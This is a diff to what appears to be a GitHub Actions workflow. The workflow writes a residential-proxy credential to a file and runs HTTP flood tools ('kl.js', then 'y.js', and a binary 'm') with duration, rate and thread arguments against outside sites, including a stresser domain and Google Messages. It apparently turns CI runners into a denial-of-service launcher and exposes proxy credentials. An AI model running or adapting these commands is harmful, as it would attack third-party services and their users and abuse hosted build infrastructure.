@@ -44,7 +44,7 @@ jobs:
           chmod +x m
           cd Fc-main
           echo "geonode_DJDQT1IiE9-type-residential:5f5a9d7a-c40b-4e86-b83d-f0bf12f4594a@92.204.164.15:9000" > output.txt
-          node kl.js GET  https://c2.dstatbot.win/YDJqk267 300 4 90 output.txt --full --debug --auth true
+          node y.js GET  https://rebirthstress.org/6901966783-5901b879-abe0-4a3b-952f-e962a3c86ac7 300 4 90  --bfm true--debug --auth true
           ./m https://messages.google.com/web/ 700 1 1 output.txt 
           
         env:
